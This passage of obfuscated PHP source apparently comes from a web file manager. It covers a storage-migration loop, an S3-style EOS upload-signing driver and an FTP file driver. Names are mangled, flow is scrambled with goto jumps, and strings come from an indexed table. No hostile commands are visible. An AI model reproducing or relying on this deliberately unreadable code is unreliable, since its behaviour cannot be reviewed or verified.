array($_SERVER[Æ¡î¢≠¯™][424] => array($_SERVER[Æ¡î¢≠¯™][726], $DΩäÊ¶¨›â), $_SERVER[Æ¡î¢≠¯™][727] => array($_SERVER[Æ¡î¢≠¯™][325], $eØ˜¯îœç™[$_SERVER[Æ¡î¢≠¯™][683]])); goto D´„ıë£ã‚; B¶ˆèéÜúä: Backup::set($a±ù£»Èè”); $this->_fileFilter($a„‚Âæç€•); return !0; goto Bﬂ¥áÒ´âÍ; A·çíèì‹Ω: $d∂≈ûú„ ∫ = !0; $Eê ∑á∂¿Ë = $this->storeIds(); $Aæ¡È∞ï©ﬂ = 1; goto Fµ¡âñéÜË; D´„ıë£ã‚: $cÔàá◊ï·´ = (int) Model($_SERVER[Æ¡î¢≠¯™][711])->where($Eíπ„–—∆„)->count($_SERVER[Æ¡î¢≠¯™][423]); $a†”›çÍŸ£ = (int) Model($_SERVER[Æ¡î¢≠¯™][711])->where($Eíπ„–—∆„)->sum($_SERVER[Æ¡î¢≠¯™][87]); $aƒç⁄®È”á = new TaskFileTransfer($_SERVER[Æ¡î¢≠¯™][728], $_SERVER[Æ¡î¢≠¯™][704], $cÔàá◊ï·´, LNG($_SERVER[Æ¡î¢≠¯™][705]) . $_SERVER[Æ¡î¢≠¯™][706] . LNG($_SERVER[Æ¡î¢≠¯™][729])); goto FπÍ’ÍÊ¶˘; FπÍ’ÍÊ¶˘: $aƒç⁄®È”á->task[$_SERVER[Æ¡î¢≠¯™][690]] = $a†”›çÍŸ£; $a±ù£»Èè” = array($_SERVER[Æ¡î¢≠¯™][730] => $cÔàá◊ï·´, $_SERVER[Æ¡î¢≠¯™][731] => $a†”›çÍŸ£); Backup::set($a±ù£»Èè”); goto A·çíèì‹Ω; Fµ¡âñéÜË: $BÙˆ›∞á∏ø = 1000; $D¨ƒÿã¬É∞ = $fçøÜ≠€˘ = 0; $a„‚Âæç€• = array(); goto fâ…ÏíßäΩ; F€ıí¯Ôˆ§: $F…≈ä≈‰∞è = $d∂≈ûú„ ∫ ? 1 : 0; $a±ù£»Èè” = array($_SERVER[Æ¡î¢≠¯™][742] => 1, $_SERVER[Æ¡î¢≠¯™][695] => time(), $_SERVER[Æ¡î¢≠¯™][701] => $F…≈ä≈‰∞è, $_SERVER[Æ¡î¢≠¯™][739] => $DΩäÊ¶¨›â, $_SERVER[Æ¡î¢≠¯™][731] => $a†”›çÍŸ£, $_SERVER[Æ¡î¢≠¯™][730] => $cÔàá◊ï·´); if ($fçøÜ≠€˘) { $a±ù£»Èè”[$_SERVER[Æ¡î¢≠¯™][740]] = $C™†•Ÿ•£ö; $a±ù£»Èè”[$_SERVER[Æ¡î¢≠¯™][741]] = $C¯∆Á˘Æ„Â; } goto B¶ˆèéÜúä; fâ…ÏíßäΩ: $C¯∆Á˘Æ„Â = $C™†•Ÿ•£ö = 0; do { $C‚ﬁ√ÃﬂﬂÍ = $_SERVER[Æ¡î¢≠¯™][732]; $cª€è≠Üì◊ = Model($_SERVER[Æ¡î¢≠¯™][711])->where($Eíπ„–—∆„)->field($C‚ﬁ√ÃﬂﬂÍ)->order($_SERVER[Æ¡î¢≠¯™][733])->selectPage($BÙˆ›∞á∏ø, $Aæ¡È∞ï©ﬂ); $f£ËøÕßëÆ = !empty($cª€è≠Üì◊[$_SERVER[Æ¡î¢≠¯™][360]]) ? $cª€è≠Üì◊[$_SERVER[Æ¡î¢≠¯™][360]] : array(); foreach ($f£ËøÕßëÆ as $FÑØá“ë‘î) { goto Cøá∂⁄ÓË⁄; f÷˘—¶óÜ¯: if (IO::exist($bÁø¯–¢ªá)) { $aƒç⁄®È”á->updateFileEnd($FÑØá“ë‘î[$_SERVER[Æ¡î¢≠¯™][28]], $FÑØá“ë‘î[$_SERVER[Æ¡î¢≠¯™][87]]); } else { $bÁø¯–¢ªá = get_path_father($bÁø¯–¢ªá); IO::mkdir($bÁø¯–¢ªá); if (!IO::copy($B»‹ÿÀıêˆ, $bÁø¯–¢ªá, $_SERVER[Æ¡î¢≠¯™][736])) { write_log($_SERVER[Æ¡î¢≠¯™][737] . $B»‹ÿÀıêˆ . $_SERVER[Æ¡î¢≠¯™][738] . $bÁø¯–¢ªá . $_SERVER[Æ¡î¢≠¯™][480], $_SERVER[Æ¡î¢≠¯™][704]); $d∂≈ûú„ ∫ = !1; break; } } $DΩäÊ¶¨›â = $FÑØá“ë‘î[$_SERVER[Æ¡î¢≠¯™][423]]; $fçøÜ≠€˘ += 1; goto e∂≈«ÕﬂÜﬁ; Cøá∂⁄ÓË⁄: if (!$this->_fileExist($FÑØá“ë‘î, $a„‚Âæç€•, $Eê ∑á∂¿Ë)) { $cÔàá◊ï·´ -= 1; $a†”›çÍŸ£ -= (int) $FÑØá“ë‘î[$_SERVER[Æ¡î¢≠¯™][87]]; write_log("\146\151\x6c\x65\x20\156\x6f\164\x20\x65\170\151\163\x74\56\x66\151\x6c\x65\111\x44\72{$FÑØá“ë‘î[$_SERVER[Æ¡î¢≠¯™][423]]}\x2c\x20\160\141\164\x68\x3a{$FÑØá“ë‘î[$_SERVER[Æ¡î¢≠¯™][85]]}", $_SERVER[Æ¡î¢≠¯™][734]); continue; } $B»‹ÿÀıêˆ = $FÑØá“ë‘î[$_SERVER[Æ¡î¢≠¯™][85]]; $bÁø¯–¢ªá = "\173\x69\157\72{$eØ˜¯îœç™[$_SERVER[Æ¡î¢≠¯™][683]]}\x7d" . substr($B»‹ÿÀıêˆ, strlen("\x7b\x69\157\72{$FÑØá“ë‘î[$_SERVER[Æ¡î¢≠¯™][735]]}\x7d")); goto f÷˘—¶óÜ¯; Dù„Œ⁄•∏à: if ($D¨ƒÿã¬É∞ >= 1024 * 1024 * 100) { $a±ù£»Èè” = array($_SERVER[Æ¡î¢≠¯™][739] => $DΩäÊ¶¨›â, $_SERVER[Æ¡î¢≠¯™][740] => $C™†•Ÿ•£ö, $_SERVER[Æ¡î¢≠¯™][741] => $C¯∆Á˘Æ„Â); Backup::set($a±ù£»Èè”); $D¨ƒÿã¬É∞ = $fçøÜ≠€˘ = 0; } goto féØãﬂ÷Ãà; e∂≈«ÕﬂÜﬁ: $D¨ƒÿã¬É∞ += $FÑØá“ë‘î[$_SERVER[Æ¡î¢≠¯™][87]]; $C™†•Ÿ•£ö += 1; $C¯∆Á˘Æ„Â += $FÑØá“ë‘î[$_SERVER[Æ¡î¢≠¯™][87]]; goto Dù„Œ⁄•∏à; féØãﬂ÷Ãà: } $D‰…äó•∫ô = count($f£ËøÕßëÆ); $Aæ¡È∞ï©ﬂ++; } while ($D‰…äó•∫ô == $BÙˆ›∞á∏ø); $aƒç⁄®È”á->end(); goto F€ıí¯Ôˆ§; Bﬂ¥áÒ´âÍ: } private function _fileExist($f√§‚ÌùÕ¥, &$cëóËﬂ´µø, $c∆Òµ…å◊¶) { goto Eê…ŸÇÑΩå; c‚åä˜Ã∞‚: if (!in_array($f√§‚ÌùÕ¥[$F¡∑Ç≤“÷—[735]], $c∆Òµ…å◊¶)) { return !1; } if (IO::exist($bø”∫óëΩ¥)) { return !0; } $aıüé¯ï≠ê = get_path_father($bø”∫óëΩ¥); goto CÍ≈ˆ†Óù¨; Eê…ŸÇÑΩå: $F¡∑Ç≤“÷— =& $_SERVER[Æ¡î¢≠¯™]; $bø”∫óëΩ¥ = $f√§‚ÌùÕ¥[$F¡∑Ç≤“÷—[85]]; if (in_array($f√§‚ÌùÕ¥[$F¡∑Ç≤“÷—[423]], $cëóËﬂ´µø)) { return !1; } goto c‚åä˜Ã∞‚; f˘Õø∂≈Ñª: $cëóËﬂ´µø = array_merge($cëóËﬂ´µø, array_to_keyvalue($bÖ—‚ç›£ö, $F¡∑Ç≤“÷—[33], $F¡∑Ç≤“÷—[423])); return !1; goto fÇ¶ÓÔ˜àë; CÍ≈ˆ†Óù¨: if (IO::exist($aıüé¯ï≠ê)) { $cëóËﬂ´µø[] = $f√§‚ÌùÕ¥[$F¡∑Ç≤“÷—[423]]; return !1; } $CÌåƒ∆Ó•‚ = array($F¡∑Ç≤“÷—[735] => $f√§‚ÌùÕ¥[$F¡∑Ç≤“÷—[735]], $F¡∑Ç≤“÷—[85] => array($F¡∑Ç≤“÷—[743], "{$aıüé¯ï≠ê}\45")); $bÖ—‚ç›£ö = Model($F¡∑Ç≤“÷—[711])->where($CÌåƒ∆Ó•‚)->field($F¡∑Ç≤“÷—[424])->select(); goto f˘Õø∂≈Ñª; fÇ¶ÓÔ˜àë: } private function _fileFilter($aÖñ“ãÎ⁄Ÿ) { $CÙ…âíê„ =& $_SERVER[Æ¡î¢≠¯™]; if (empty($aÖñ“ãÎ⁄Ÿ)) { return; } $e‹åºœ∏™ﬂ = array($CÙ…âíê„[423] => array($CÙ…âíê„[7], array_unique($aÖñ“ãÎ⁄Ÿ))); $AËßù«≤¿µ = Model($CÙ…âíê„[744])->where($e‹åºœ∏™ﬂ)->field($CÙ…âíê„[374])->select(); foreach ($AËßù«≤¿µ as $AçìﬁÍ·∏ü) { Model($CÙ…âíê„[744])->remove($AçìﬁÍ·∏ü[$CÙ…âíê„[374]], !1); } } private function storeIds() { $BÆ´Üáûù± =& $_SERVER[Æ¡î¢≠¯™]; $FÖƒÇÿ∞‚ = Model($BÆ´Üáûù±[696])->listData(); return array_to_keyvalue($FÖƒÇÿ∞‚, $BÆ´Üáûù±[33], $BÆ´Üáûù±[372]); } } goto dÏΩâΩµµ§; A™å¿◊πû∑: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($a„∂∫ú—»Ù) { parent::__construct($a„∂∫ú—»Ù); $this->signatureVersion($_SERVER[Æ¡î¢≠¯™][207]); } public function uploadFormData($bÜªÔÁ¡Ñç, $DßéˆÌ»⁄É = 3600) { goto a±Çª»ÒëÏ; a±Çª»ÒëÏ: $f‰ŸßèœùØ =& $_SERVER[Æ¡î¢≠¯™]; $CÏ”áôÑ√≈ = $f‰ŸßèœùØ[192]; $EÒ∏…Ÿ√õ‚ = $f‰ŸßèœùØ[1112]; goto aƒ‘…Æ’ä¢; Aåå–—ôî: $BÒ◊Æ‚ﬁïÒ = array($this->accessKey, $CÃÇÌÜ◊üﬁ, $this->region, $bµïëﬁƒáœ, $DÊÈ™⁄¡‰ä); $eÉ´—£êÕ‚ = implode($f‰ŸßèœùØ[8], $BÒ◊Æ‚ﬁïÒ); $CÈØßãÿΩã = array($f‰ŸßèœùØ[1081] => gmdate($f‰ŸßèœùØ[1080], strtotime($f‰ŸßèœùØ[1115])), $f‰ŸßèœùØ[1082] => array(array($f‰ŸßèœùØ[1084] => $this->bucket), array($f‰ŸßèœùØ[1083] => $CÏ”áôÑ√≈), array($f‰ŸßèœùØ[1085], $f‰ŸßèœùØ[1086], $f‰ŸßèœùØ[33]), array($f‰ŸßèœùØ[1085], $f‰ŸßèœùØ[1116], $f‰ŸßèœùØ[33]), array($f‰ŸßèœùØ[1085], $f‰ŸßèœùØ[1117], $f‰ŸßèœùØ[33]), array($f‰ŸßèœùØ[1087] => $fæóô∂Òî—), array($f‰ŸßèœùØ[1118] => $eÉ´—£êÕ‚), array($f‰ŸßèœùØ[1119] => $EÒ∏…Ÿ√õ‚), array($f‰ŸßèœùØ[1120] => $AÇüö®ì∂¥), array($f‰ŸßèœùØ[1121] => $CÓë¨öñáË))); goto BŒüèâˆá; aƒ‘…Æ’ä¢: $bµïëﬁƒáœ = $f‰ŸßèœùØ[69]; $AÇüö®ì∂¥ = gmdate($f‰ŸßèœùØ[1113]); $CÃÇÌÜ◊üﬁ = gmdate($f‰ŸßèœùØ[682]); goto dÿ◊åÂ⁄áà; fÉ‘èçê«ç: $c“ä€Ωæê… = array($f‰ŸßèœùØ[206] => $f‰ŸßèœùØ[33], $f‰ŸßèœùØ[1124] => $f‰ŸßèœùØ[33], $f‰ŸßèœùØ[1083] => $CÏ”áôÑ√≈, $f‰ŸßèœùØ[1087] => $fæóô∂Òî—, $f‰ŸßèœùØ[1091] => $aåÛ–‚ü ±, $f‰ŸßèœùØ[1125] => $eÉ´—£êÕ‚, $f‰ŸßèœùØ[1126] => $EÒ∏…Ÿ√õ‚, $f‰ŸßèœùØ[1127] => $AÇüö®ì∂¥, $f‰ŸßèœùØ[1128] => $CÓë¨öñáË, $f‰ŸßèœùØ[1129] => $Bß êç‹”‚, $f‰ŸßèœùØ[176] => $this->getHost()); return $c“ä€Ωæê…; goto Eù≥åë¬ôÛ; BŒüèâˆá: $aåÛ–‚ü ± = base64_encode(json_encode($CÈØßãÿΩã)); $DÊíÎÜèˆ˜ = hash_hmac($f‰ŸßèœùØ[1122], $CÃÇÌÜ◊üﬁ, $f‰ŸßèœùØ[1123] . $this->secret, !0); $f◊ÆÇ……‚Ü = hash_hmac($f‰ŸßèœùØ[1122], $this->region, $DÊíÎÜèˆ˜, !0); goto aâŸ‡éìÉ‹; aâŸ‡éìÉ‹: $e∂–ÑÑÜ◊î = hash_hmac($f‰ŸßèœùØ[1122], $bµïëﬁƒáœ, $f◊ÆÇ……‚Ü, !0); $B¬õ““â›‰ = hash_hmac($f‰ŸßèœùØ[1122], $DÊÈ™⁄¡‰ä, $e∂–ÑÑÜ◊î, !0); $Bß êç‹”‚ = hash_hmac($f‰ŸßèœùØ[1122], $aåÛ–‚ü ±, $B¬õ““â›‰); goto fÉ‘èçê«ç; dÿ◊åÂ⁄áà: $DÊÈ™⁄¡‰ä = $f‰ŸßèœùØ[1114]; $CÓë¨öñáË = $DßéˆÌ»⁄É . $f‰ŸßèœùØ[33]; $fæóô∂Òî— = $f‰ŸßèœùØ[1079]; goto Aåå–—ôî; Eù≥åë¬ôÛ: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($dÉÛÒ©÷ÙÙ) { parent::__construct(); if (count($dÉÛÒ©÷ÙÙ) > 0) { $this->_init($dÉÛÒ©÷ÙÙ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($aˆ´ÙŸãûÛ) { $cæ™£ﬂìﬂ÷ =& $_SERVER[Æ¡î¢≠¯™]; global $config; $this->appCharset = $config[$cæ™£ﬂìﬂ÷[1130]]; $this->systemCharset = $config[$cæ™£ﬂìﬂ÷[1131]]; if (isset($aˆ´ÙŸãûÛ[$cæ™£ﬂìﬂ÷[1132]]) && $aˆ´ÙŸãûÛ[$cæ™£ﬂìﬂ÷[1132]]) { $this->systemCharset = $aˆ´ÙŸãûÛ[$cæ™£ﬂìﬂ÷[1132]]; } } public function iconvApp($BÖ…—√πÆÿ) { return $this->iconvTo($BÖ…—√πÆÿ, $this->systemCharset, $this->appCharset); } public function iconvSystem($cËËªìãÜÇ) { return $this->iconvTo($cËËªìãÜÇ, $this->appCharset, $this->systemCharset); } public function getPathOuter($fÙÛ´„âÓÙ) { goto c‚¬ä·éå«; eπ°ŸÎå¨Ú: return $this->pathDriver . $D£ô…ÁêúÇ[8] . ltrim($fÙÛ´„âÓÙ, $D£ô…ÁêúÇ[8]); goto aáû·æ—–‹; bô£ﬂï›Ñ∫: $fÙÛ´„âÓÙ = KodIO::clear($fÙÛ´„âÓÙ); $fÙÛ´„âÓÙ = substr($fÙÛ´„âÓÙ, strlen($Dı˘à†£∂⁄)); if (empty($this->pathDriver)) { return $fÙÛ´„âÓÙ; } goto eπ°ŸÎå¨Ú; c‚¬ä·éå«: $D£ô…ÁêúÇ =& $_SERVER[Æ¡î¢≠¯™]; $Dı˘à†£∂⁄ = $this->iconvApp($this->pathBase); $fÙÛ´„âÓÙ = $this->iconvApp($fÙÛ´„âÓÙ); goto a“—’∑°ùî; a“—’∑°ùî: if (substr($Dı˘à†£∂⁄, 0, 2) == $D£ô…ÁêúÇ[1133]) { $Dı˘à†£∂⁄ = BASIC_PATH . substr($Dı˘à†£∂⁄, 2); } if (substr($fÙÛ´„âÓÙ, 0, 2) == $D£ô…ÁêúÇ[1133]) { $fÙÛ´„âÓÙ = BASIC_PATH . substr($fÙÛ´„âÓÙ, 2); } $Dı˘à†£∂⁄ = KodIO::clear($Dı˘à†£∂⁄); goto bô£ﬂï›Ñ∫; aáû·æ—–‹: } private function _init($DºÙ—Ì†‰é = array()) { goto C”üÑíﬁæ‰; eÒàø∏¬–…: return $a¶–ªïºœ¯; goto A‰Õ»ﬂàö£; e∂íÔ≤¶“‹: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $a¶–ªïºœ¯ = @ftp_login($this->connect, $this->username, $this->userpass); goto bÍ≠≠Ë®◊ ; C”üÑíﬁæ‰: $e≠ΩÛÓüœÎ =& $_SERVER[Æ¡î¢≠¯™]; if (!function_exists($e≠ΩÛÓüœÎ[1134])) { show_json(LNG($e≠ΩÛÓüœÎ[1135]), !1); } $this->charsetReset($DºÙ—Ì†‰é); goto C∆ Ô†πµå; AÓ÷’°äíÜ: if (isset($DìËªŸá¶á[$EÎÌ◊–Îà”])) { foreach ($DìËªŸá¶á[$EÎÌ◊–Îà”] as $Fö–Ñ∂¶˜ñ => $EŒ€˘æøüç) { $this->{$Fö–Ñ∂¶˜ñ} = $EŒ€˘æøüç; } return !0; } $eÂùâøÑÕ€ = parse_url(trim($this->server, $e≠ΩÛÓüœÎ[8])); $this->host = $eÂùâøÑÕ€[$e≠ΩÛÓüœÎ[176]]; goto bå…ÈøŸË◊; C∆ Ô†πµå: foreach ($DºÙ—Ì†‰é as $Fö–Ñ∂¶˜ñ => $EŒ€˘æøüç) { if (isset($this->{$Fö–Ñ∂¶˜ñ})) { $this->{$Fö–Ñ∂¶˜ñ} = $EŒ€˘æøüç; } } static $DìËªŸá¶á = array(); $EÎÌ◊–Îà” = md5(json_encode($DºÙ—Ì†‰é)); goto AÓ÷’°äíÜ; bÍ≠≠Ë®◊ : @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $DìËªŸá¶á[$EÎÌ◊–Îà”] = array($e≠ΩÛÓüœÎ[1139] => $this->connect, $e≠ΩÛÓüœÎ[176] => $this->host, $e≠ΩÛÓüœÎ[175] => $this->scheme, $e≠ΩÛÓüœÎ[177] => $this->port); goto eÒàø∏¬–…; bå…ÈøŸË◊: $eÌ±úÛ∂»è = isset($eÂùâøÑÕ€[$e≠ΩÛÓüœÎ[175]]) && $eÂùâøÑÕ€[$e≠ΩÛÓüœÎ[175]] == $e≠ΩÛÓüœÎ[1136] ? !0 : !1; $this->scheme = $eÌ±úÛ∂»è ? $e≠ΩÛÓüœÎ[1137] : $e≠ΩÛÓüœÎ[1138]; $this->port = isset($eÂùâøÑÕ€[$e≠ΩÛÓüœÎ[177]]) ? $eÂùâøÑÕ€[$e≠ΩÛÓüœÎ[177]] : 21; goto e∂íÔ≤¶“‹; A‰Õ»ﬂàö£: } private function _isconn() { return is_resource($this->connect); } public function mkfile($Dà£¥§ò»‘, $eÜÊÀ™ô¿ë = '', $CÆóˆç∂”® = REPEAT_RENAME) { if ($this->setContent($Dà£¥§ò»‘, $eÜÊÀ™ô¿ë)) { return $this->getPathOuter($Dà£¥§ò»‘); } return !1; } public function mkdir($eõÃãè©·â, $D¨È‹Üáóè = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $eõÃãè©·â = $this->iconvSystem($eõÃãè©·â); if ($this->isFolder($eõÃãè©·â) || @ftp_mkdir($this->connect, $eõÃãè©·â)) { return $this->getPathOuter($eõÃãè©·â); } if (!$this->mkdir($this->pathFather($eõÃãè©·â))) { return !1; } if ($eõÃãè©·â = @ftp_mkdir($this->connect, $eõÃãè©·â)) { return $this->getPathOuter($eõÃãè©·â); } return !1; } public function copyFile($cÍŸ˜ûò£¥, $a§Í≈§“ò£) { goto e∏“≈˘Ë≥Ü; e∏“≈˘Ë≥Ü: if (!$this->_isconn()) { return !1; } $CÜŸ†ãÊø† = $this->pathThis($this->iconvSystem($cÍŸ˜ûò£¥)); $Aì¬Ïπ›¬‚ = $this->tempFile($CÜŸ†ãÊø†); goto BÎç≥™“ûÚ; a…ñÛ›Ç±æ: $this->tempFileRemve($Aì¬Ïπ›¬‚); return $c∑‚Ø»ˆî›; goto fΩ±ûü⁄àÆ; BÎç≥™“ûÚ: $C⁄ÊàÃáë = $this->iconvApp($Aì¬Ïπ›¬‚); $this->download($cÍŸ˜ûò£¥, $C⁄ÊàÃáë); $c∑‚Ø»ˆî› = $this->upload($a§Í≈§“ò£, $C⁄ÊàÃáë); goto a…ñÛ›Ç±æ; fΩ±ûü⁄àÆ: } public function moveFile($e«Ú¢∞ª≤’, $fÖÜ≠àŸÈß) { if (!$this->_isconn()) { return !1; } $e«Ú¢∞ª≤’ = $this->iconvSystem($e«Ú¢∞ª≤’); $fÖÜ≠àŸÈß = $this->iconvSystem($fÖÜ≠àŸÈß); $AàÓóÊ‰öÔ = @ftp_rename($this->connect, $e«Ú¢∞ª≤’, $fÖÜ≠àŸÈß); return $AàÓóÊ‰öÔ ? $this->getPathOuter($fÖÜ≠àŸÈß) : !1; } public function delFile($E∞¥·§”âÕ) { if (!$this->_isconn()) { return !1; } $E∞¥·§”âÕ = $this->iconvSystem($E∞¥·§”âÕ); return @ftp_delete($this->connect, $E∞¥·§”âÕ); } public function delFolder($b‚ùá´Áêí) { if (!$this->_isconn()) { return !1; } $b‚ùá´Áêí = $this->iconvSystem($b‚ùá´Áêí); $EØ•æ◊äˆá = $this->ftpList($b‚ùá´Áêí); if (!$EØ•æ◊äˆá) { return @ftp_rmdir($this->connect, $b‚ùá´Áêí); } foreach ($EØ•æ◊äˆá as $fä◊£∞¿¢ü) { if ($this->isFolder($fä◊£∞¿¢ü)) { $fä◊£∞¿¢ü = $this->iconvApp($fä◊£∞¿¢ü); $this->delFolder($fä◊£∞¿¢ü); } else { @ftp_delete($this->connect, $fä◊£∞¿¢ü); } } return @ftp_rmdir($this->connect, $b‚ùá´Áêí); } public function rename($DøÎûªº≤¨, $D¯∫âä˘É©) { goto FÉÁﬂÏ´—¨; FÉÁﬂÏ´—¨: $CÏÉô‡‡»≤ =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->_isconn()) { return !1; } $F‚≤ºûÕ“ë = $this->fileNameAuto($this->pathFather($DøÎûªº≤¨), $D¯∫âä˘É©); goto fÆ¢çÊò˜á; fÆ¢çÊò˜á: $F‚≤ºûÕ“ë = $this->iconvSystem($F‚≤ºûÕ“ë); $DøÎûªº≤¨ = $this->iconvSystem($DøÎûªº≤¨); $D¶‹™ñ»âπ = $this->pathFather($DøÎûªº≤¨); goto E≤ä°îáêî; E≤ä°îáêî: $Fí‰©ä”€ò = rtrim($D¶‹™ñ»âπ, $CÏÉô‡‡»≤[8]) . $CÏÉô‡‡»≤[8] . $F‚≤ºûÕ“ë; $d±¯ç§Áù∞ = @ftp_rename($this->connect, $DøÎûªº≤¨, $Fí‰©ä”€ò); $Fí‰©ä”€ò = $this->iconvApp($Fí‰©ä”€ò); goto CºéÁäë–Ö; CºéÁäë–Ö: return $d±¯ç§Áù∞ ? $this->getPathOuter($Fí‰©ä”€ò) : !1; goto BÙµãÒüÛ‚; BÙµãÒüÛ‚: } private function folderInfo($CÕí°“ñûÏ, $E¨–õ¯É√ï = false) { goto cüˆ÷™Œ√Í; c‘°◊ÏÙéï: return $cÈﬂò¢ëù±; goto dõ€ ØœÖÏ; c´Ô„ââ¨›: $bŸ…›Ûπùí = $this->iconvSystem($CÕí°“ñûÏ); if ($E¨–õ¯É√ï) { return array($bË§çñ≤ÔŒ[28] => $däçÁ≤ì‘â, $bË§çñ≤ÔŒ[85] => $b•Ø»ÿåá†, $bË§çñ≤ÔŒ[29] => $bË§çñ≤ÔŒ[86]); } $cÈﬂò¢ëù± = array($bË§çñ≤ÔŒ[28] => $däçÁ≤ì‘â, $bË§çñ≤ÔŒ[85] => $b•Ø»ÿåá†, $bË§çñ≤ÔŒ[29] => $bË§çñ≤ÔŒ[86], $bË§çñ≤ÔŒ[194] => 0, $bË§çñ≤ÔŒ[117] => 0, $bË§çñ≤ÔŒ[1140] => !0, $bË§çñ≤ÔŒ[1141] => !0); goto c‘°◊ÏÙéï; cüˆ÷™Œ√Í: $bË§çñ≤ÔŒ =& $_SERVER[Æ¡î¢≠¯™]; $b•Ø»ÿåá† = $this->getPathOuter(rtrim($CÕí°“ñûÏ, $bË§çñ≤ÔŒ[8])); $däçÁ≤ì‘â = $this->pathThis($b•Ø»ÿåá†); goto c´Ô„ââ¨›; dõ€ ØœÖÏ: } private function fileInfo($bıÈÀª™Ì‡, $D¢√õ‚Ïàä = false) { goto BëÖÚúµó»; a≈õ◊†ôΩ™: $DŸ‰πáÒ‚ã[$CÕµã¬ÜÜó[117]] = $DŸ‰πáÒ‚ã[$CÕµã¬ÜÜó[117]] > 0 ? $DŸ‰πáÒ‚ã[$CÕµã¬ÜÜó[117]] : 0; return $DŸ‰πáÒ‚ã; goto D„ñå®ª”é; CÌÊÆÙÖ·À: $Cû»îÎîÀê = $this->iconvSystem($bıÈÀª™Ì‡); if ($D¢√õ‚Ïàä) { return array($CÕµã¬ÜÜó[28] => $D¬ìÌöÁÍ, $CÕµã¬ÜÜó[85] => $FÜ≈ËıÏ—õ, $CÕµã¬ÜÜó[29] => $CÕµã¬ÜÜó[174], $CÕµã¬ÜÜó[167] => $this->ext($bıÈÀª™Ì‡), $CÕµã¬ÜÜó[87] => $this->size($bıÈÀª™Ì‡)); } $DŸ‰πáÒ‚ã = array($CÕµã¬ÜÜó[28] => $D¬ìÌöÁÍ, $CÕµã¬ÜÜó[85] => $FÜ≈ËıÏ—õ, $CÕµã¬ÜÜó[29] => $CÕµã¬ÜÜó[174], $CÕµã¬ÜÜó[194] => 0, $CÕµã¬ÜÜó[117] => @ftp_mdtm($this->connect, $Cû»îÎîÀê), $CÕµã¬ÜÜó[167] => $this->ext($bıÈÀª™Ì‡), $CÕµã¬ÜÜó[87] => $this->size($bıÈÀª™Ì‡), $CÕµã¬ÜÜó[1140] => !0, $CÕµã¬ÜÜó[1141] => !0); goto a≈õ◊†ôΩ™; BëÖÚúµó»: $CÕµã¬ÜÜó =& $_SERVER[Æ¡î¢≠¯™]; $FÜ≈ËıÏ—õ = $this->getPathOuter(rtrim($bıÈÀª™Ì‡, $CÕµã¬ÜÜó[8])); $D¬ìÌöÁÍ = $this->pathThis($FÜ≈ËıÏ—õ); goto CÌÊÆÙÖ·À; D„ñå®ª”é: } public function size($fÜÉ÷À∑èí) { $f∂®¶ø„…£ = $this->objectMeta($fÜÉ÷À∑èí); return $f∂®¶ø„…£ ? $f∂®¶ø„…£[$_SERVER[Æ¡î¢≠¯™][87]] : 0; } public function info($e–‘ò»–äÍ) { if ($this->isFile($e–‘ò»–äÍ)) { return $this->fileInfo($e–‘ò»–äÍ, 0); } else { if ($this->isFolder($e–‘ò»–äÍ)) { return $this->folderInfo($e–‘ò»–äÍ); } } return !1; } public function exist($C≤É…µŒ¶À) { return $this->objectMeta($C≤É…µŒ¶À) ? !0 : !1; } public function isFile($e∑ã≠Í™‹â) { $D‡ã˜Üûû⁄ =& $_SERVER[Æ¡î¢≠¯™]; $fı√÷Ø†Ïö = $this->objectMeta($e∑ã≠Í™‹â); return $fı√÷Ø†Ïö ? $fı√÷Ø†Ïö[$D‡ã˜Üûû⁄[29]] == $D‡ã˜Üûû⁄[174] : !1; } public function isFolder($BÖá¬é»†å) { $F äÏŸƒØ¿ =& $_SERVER[Æ¡î¢≠¯™]; $dõÀåËœΩ¬ = $this->objectMeta($BÖá¬é»†å); return $dõÀåËœΩ¬ ? $dõÀåËœΩ¬[$F äÏŸƒØ¿[29]] == $F äÏŸƒØ¿[86] : !1; } public function listPath($c¯¥èáÛµ, $bÖ∑∂ìÌ±√ = false) { goto bπ·≤Ç¥®ª; aªÍÏæê•Ã: foreach ($Bû“ïê…òﬁ as $c¯¥èáÛµ) { if ($this->isFolder($c¯¥èáÛµ)) { $Aïÿ¶ëæ÷£[$aôà¯´°‡‘[84]][] = $this->folderInfo($c¯¥èáÛµ, $bÖ∑∂ìÌ±√); } else { $Aïÿ¶ëæ÷£[$aôà¯´°‡‘[83]][] = $this->fileInfo($c¯¥èáÛµ, $bÖ∑∂ìÌ±√); } } return $Aïÿ¶ëæ÷£; goto Cê›π‡Íëë; DﬁöçéÿæÂ: $Bû“ïê…òﬁ = $this->ftpList($c¯¥èáÛµ); $Aïÿ¶ëæ÷£ = array($aôà¯´°‡‘[84] => array(), $aôà¯´°‡‘[83] => array()); if (!$Bû“ïê…òﬁ) { return $Aïÿ¶ëæ÷£; } goto aªÍÏæê•Ã; bπ·≤Ç¥®ª: $aôà¯´°‡‘ =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->_isconn()) { return !1; } $c¯¥èáÛµ = $this->iconvSystem($c¯¥èáÛµ); goto DﬁöçéÿæÂ; Cê›π‡Íëë: } public function has($e—çÓ∏ÓºÍ, $b∂∏≤ò›É£ = false, $E∞Ü§üö‡≈ = true) { goto AÎÈæÑ∂Ö€; BéÑÏú‘ìÁ: $A∆Ã˜ëêÍﬂ = $this->ftpList($e—çÓ∏ÓºÍ); if (!$A∆Ã˜ëêÍﬂ) { return !1; } if ($b∂∏≤ò›É£) { return array($BüÉ•õè‡˘[198] => 0, $BüÉ•õè‡˘[199] => count($A∆Ã˜ëêÍﬂ)); } goto fÇÃÈã«éÈ; fÇÃÈã«éÈ: foreach ($A∆Ã˜ëêÍﬂ as $e—çÓ∏ÓºÍ) { if ($E∞Ü§üö‡≈) { if (!$this->isFolder($e—çÓ∏ÓºÍ)) { return !0; } } else { if ($this->isFolder($e—çÓ∏ÓºÍ)) { return !0; } } } return !1; goto eÊ⁄∑É≠∏ﬂ; AÎÈæÑ∂Ö€: $BüÉ•õè‡˘ =& 